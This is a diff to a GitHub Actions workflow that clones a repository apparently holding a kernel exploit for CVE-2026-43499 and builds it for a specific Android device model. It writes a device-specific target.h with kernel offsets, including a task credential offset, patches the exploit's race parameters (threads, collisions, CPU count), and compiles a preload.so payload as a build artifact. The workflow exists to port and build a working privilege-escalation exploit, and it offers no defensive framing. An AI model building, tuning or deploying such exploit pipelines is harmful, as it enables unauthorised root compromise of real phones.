@@ -1,4 +1,4 @@
-name: build_k40_port_m36_FINAL_VERIFIED
+name: build_m36_correct_target
 on: [push, workflow_dispatch]
 
 jobs:
@@ -24,13 +24,29 @@ jobs:
           git clone https://github.com/yijiacloud/ghostlock-cve-2026-43499-4.19-k40.git
           cd ghostlock-cve-2026-43499-4.19-k40
 
-      - name: OVERWRITE target.h AND VERIFY
+      - name: Find which target.h the Makefile actually uses
         run: |
           cd ghostlock-cve-2026-43499-4.19-k40
-          TARGET_FILE="src/targets/oplus-4.19.157-perf/target.h"
+          echo "=== Makefile content ==="
+          cat Makefile | head -n 30
+          echo ""
+          echo "=== Existing targets ==="
+          ls -la src/targets/
+          echo ""
+          echo "=== Default PROJECT in Makefile ==="
+          grep -n "PROJECT" Makefile || echo "PROJECT not defined"
+
+      - name: Create target.h in the CORRECT directory
+        run: |
+          cd ghostlock-cve-2026-43499-4.19-k40
           
-          # Write our custom target.h
-          cat > "$TARGET_FILE" << 'EOF'
+          # Create BOTH possible target directories to be safe
+          mkdir -p src/targets/blazer-CP2A.260605.012
+          mkdir -p src/targets/oplus-4.19.157-perf
+          
+          # Write our custom target.h to both
+          for TARGET_DIR in "src/targets/blazer-CP2A.260605.012" "src/targets/oplus-4.19.157-perf"; do
+            cat > "$TARGET_DIR/target.h" << 'EOF'
           #ifndef TARGET_H
           #define TARGET_H
 
@@ -221,61 +237,50 @@ jobs:
 
           #endif
           EOF
-          
-          echo "=== VERIFICATION: target.h ==="
-          grep "BUILD_VARIANT_LABEL" "$TARGET_FILE"
-          grep "P0_PHYS_OFFSET" "$TARGET_FILE"
-          grep "TASK_REAL_CRED_OFF" "$TARGET_FILE"
-          
-          if ! grep -q "m36_mt6762v_a13" "$TARGET_FILE"; then
-            echo "ERROR: target.h was NOT overwritten correctly!"
-            exit 1
-          fi
-          echo "=== target.h OK ==="
+            echo "Created target.h in $TARGET_DIR"
+            grep "BUILD_VARIANT_LABEL" "$TARGET_DIR/target.h"
+          done
 
-      - name: FIND AND PATCH CPU / THREADS / COLLISIONS
+      - name: Patch CPU / THREADS / COLLISIONS (Python, robust)
         run: |
           cd ghostlock-cve-2026-43499-4.19-k40
           
-          echo "=== BEFORE PATCH ==="
-          grep -rn "thread_cnt\|collisions\|g_cpu_count" src/*.c src/*.h | head -n 20
+          echo "=== BEFORE ==="
+          grep -rn "thread_cnt\|collisions\|cpu_count" src/*.c src/*.h 2>/dev/null | head -n 20
           
-          # We use python to do the replacement with exact strings, since sed is failing
           python3 << 'PYEOF'
           import os, re
-          
           for root, dirs, files in os.walk('src'):
               for f in files:
                   if f.endswith('.c') or f.endswith('.h'):
                       path = os.path.join(root, f)
-                      with open(path, 'r') as file:
-                          content = file.read()
-                      
-                      # Replace thread_cnt
-                      content = re.sub(r'\bthread_cnt\s*=\s*8\b', 'thread_cnt = 7', content)
-                      content = re.sub(r'\bg_thread_cnt\s*=\s*8\b', 'g_thread_cnt = 7', content)
-                      
-                      # Replace collisions
-                      content = re.sub(r'\bcollisions\s*=\s*4\b', 'collisions = 16', content)
-                      content = re.sub(r'\bg_collisions\s*=\s*4\b', 'g_collisions = 16', content)
-                      
-                      # Replace cpu_count
-                      content = re.sub(r'\bg_cpu_count\s*=\s*16\b', 'g_cpu_count = 8', content)
-                      content = re.sub(r'\bcpu_count\s*=\s*16\b', 'cpu_count = 8', content)
-                      
-                      with open(path, 'w') as file:
-                          file.write(content)
+                      try:
+                          with open(path, 'r') as file:
+                              content = file.read()
+                          
+                          # Use regex with \b word boundaries to avoid partial matches
+                          content = re.sub(r'\bthread_cnt\s*=\s*8\b', 'thread_cnt = 7', content)
+                          content = re.sub(r'\bg_thread_cnt\s*=\s*8\b', 'g_thread_cnt = 7', content)
+                          content = re.sub(r'\bcollisions\s*=\s*4\b', 'collisions = 16', content)
+                          content = re.sub(r'\bg_collisions\s*=\s*4\b', 'g_collisions = 16', content)
+                          content = re.sub(r'\bg_cpu_count\s*=\s*16\b', 'g_cpu_count = 8', content)
+                          content = re.sub(r'\bcpu_count\s*=\s*16\b', 'cpu_count = 8', content)
+                          
+                          with open(path, 'w') as file:
+                              file.write(content)
+                      except Exception as e:
+                          print(f"Error on {path}: {e}")
           PYEOF
           
-          echo "=== AFTER PATCH ==="
-          grep -rn "thread_cnt\|collisions\|g_cpu_count" src/*.c src/*.h | head -n 20
+          echo "=== AFTER ==="
+          grep -rn "thread_cnt\|collisions\|cpu_count" src/*.c src/*.h 2>/dev/null | head -n 20
 
       - name: Build with NDK
         env:
           ANDROID_NDK_HOME: ${{ steps.setup-ndk.outputs.ndk-path }}
         run: |
           cd ghostlock-cve-2026-43499-4.19-k40
-          make PROJECT=oplus-4.19.157-perf NDK_ROOT="$ANDROID_NDK_HOME"
+          make PROJECT=blazer-CP2A.260605.012 NDK_ROOT="$ANDROID_NDK_HOME"
           
           mkdir -p /tmp/out
           find . -name "preload.so" -exec cp {} /tmp/out/ \;
@@ -284,5 +289,5 @@ jobs:
 
       - uses: actions/upload-artifact@v4
         with:
-          name: ghostlock-m36-final-v2
+          name: ghostlock-m36-correct
           path: /tmp/out/
